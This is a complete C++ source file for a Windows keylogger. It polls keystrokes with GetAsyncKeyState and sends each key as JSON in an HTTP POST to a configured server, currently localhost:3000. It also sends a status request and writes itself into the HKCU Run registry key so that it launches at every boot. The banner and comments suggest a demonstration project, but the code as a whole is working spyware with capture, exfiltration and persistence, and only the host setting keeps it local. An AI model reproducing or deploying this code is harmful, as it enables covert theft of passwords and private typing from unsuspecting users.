#include <iostream>
#include <fstream>
#include <Windows.h>
#include <WinUser.h>
#include <WinInet.h>
#pragma comment(lib, "wininet.lib")
#include <chrono>
#include <ctime>
#include <sstream>
#include <iomanip>

using namespace std;

const char* serverName = "localhost";
const int serverPort = 3000;
const char* urlPath = "";
char lastKey = '~';

int sendStatus();

string getIPAddress();

long long currentTimeMicros() {
    auto now = std::chrono::high_resolution_clock::now();
    return std::chrono::time_point_cast<std::chrono::microseconds>(now).time_since_epoch().count();
}


void sendToServer(char* data)
{
    HINTERNET hInternet = InternetOpenA("Keylogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        cout << "Error: Could not open internet" << endl;
        return;
    }

    HINTERNET hConnect = InternetConnectA(hInternet, serverName, serverPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (hConnect == NULL)
    {
        cout << "Error: Could not connect to server" << endl;
        InternetCloseHandle(hInternet);
        return;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlPath, NULL, NULL, NULL, 0, 0);
    if (hRequest == NULL)
    {
        cout << "Error: Could not open request" << endl;
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    const char* headers = "Content-Type: application/json";
    char postData[256];
    sprintf_s(postData, "{\"key\":\"%s\"}", data);
    if (!HttpSendRequestA(hRequest, headers, strlen(headers), postData, strlen(postData)))
    {
        cout << "Error: Could not send request" << endl;
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

int main()
{
    cout << "YOU ARE SENDING YOUR KEY INPUTS TO: " << serverName << ":" << serverPort;
    sendStatus();

    // You can comment this section to avoid autorun with boot or remember to delete app from registry later
    // Get the location of the currently running executable
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    //add app to register to open it automatically each boot
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueEx(hKey, "MyApp", 0, REG_SZ, (LPBYTE)path, strlen(path) + 1);
    RegCloseKey(hKey);

    long long lastTime = 0;
    // define the whitelist of keycodes to monitor
    const int numKeys = 129;
    int keys[numKeys] = {0x12,
            0x20,
            0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, // 0-9
            0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, // A-Z
            0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A,
            0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, // a-z
            0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A,
            0x21, 0x40, 0x23, 0x24, 0x25, 0x5E, 0x26, 0x2A, 0x28, 0x29, 0x5F, 0x2B, 0x2D, // symbols
            0x3D, 0x2C, 0x3C, 0x3E, 0x2E, 0x3F, 0x2F, 0x3B, 0x27, 0x3A, 0x5B, 0x5D, 0x7B, 0x7D,
            0xBA, 0xBF, 0xC0, 0xC1, 0xDB, 0xDC, 0xDD, 0xDE,
            0x21, 0x40, 0x23, 0x24, 0x25, 0x5E, 0x26, 0x2A, 0x28, 0x29, 0x5F, 0x2B, 0x2D, // duplicate symbols
            0x3D, 0x2C, 0x3C, 0x3E, 0x2E, 0x3F, 0x2F, 0x3B, 0x27, 0x3A, 0x5B, 0x5D, 0x7B, 0x7D,
            0x7C, 0x22, 0x3C
    };

    while (true)
    {
        for (int i = 0; i < numKeys; i++) {
            if (GetAsyncKeyState(keys[i]) & 0x8000) {
                long long currentTime = currentTimeMicros();
                char key = static_cast<char>(keys[i]);
                if (keys[i] >= 0x41 && keys[i] <= 0x5A) {
                    key += 32;
                }
                if ( (currentTime - lastTime >= 70000)) {
                    if(lastKey == key && (currentTime - lastTime <= 300000)) continue;
                    char postData[2];
                    postData[0] = key;
                    cout << key;
                    sendToServer(postData);
                    lastKey = key;
                    lastTime = currentTime;
                }
            }
        }
        Sleep(10);
    }

    return 0;
}

int sendStatus() {
    string ipAddress = "localhost";
    time_t t = time(NULL);
    tm* tPtr = localtime(&t);

    stringstream ss;
    ss << setw(4) << setfill('0') << tPtr->tm_year + 1900 << "-" << setw(2) << setfill('0') << tPtr->tm_mon + 1 << "-" << setw(2) << setfill('0') << tPtr->tm_mday;
    string date = ss.str();

    string urlPath = "/ip/" + ipAddress + "/" + date;

    HINTERNET hInternet = InternetOpenA("IpAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        cout << "Error: Could not open internet connection" << endl;
        return 1;
    }

    HINTERNET hConnect = InternetConnectA(hInternet, ipAddress.c_str(), 3000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (hConnect == NULL)
    {
        cout << "Error: Could not connect to server" << endl;
        InternetCloseHandle(hInternet);
        return 1;
    }


    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", urlPath.c_str(), NULL, NULL, NULL, 0, 0);
    if (hRequest == NULL)
    {
        cout << "Error: Could not open HTTP request" << endl;
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }


    BOOL result = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
    if (!result)
    {
        cout << "Error: Could not send HTTP request" << endl;
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    const int bufferSize = 4096;
    char buffer[bufferSize];
    DWORD bytesRead = 0;
    while (InternetReadFile(hRequest, buffer, bufferSize - 1, &bytesRead) && bytesRead > 0)
    {
        buffer[bytesRead] = '\0';
        cout << buffer << endl;
    }


    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return 0;
}


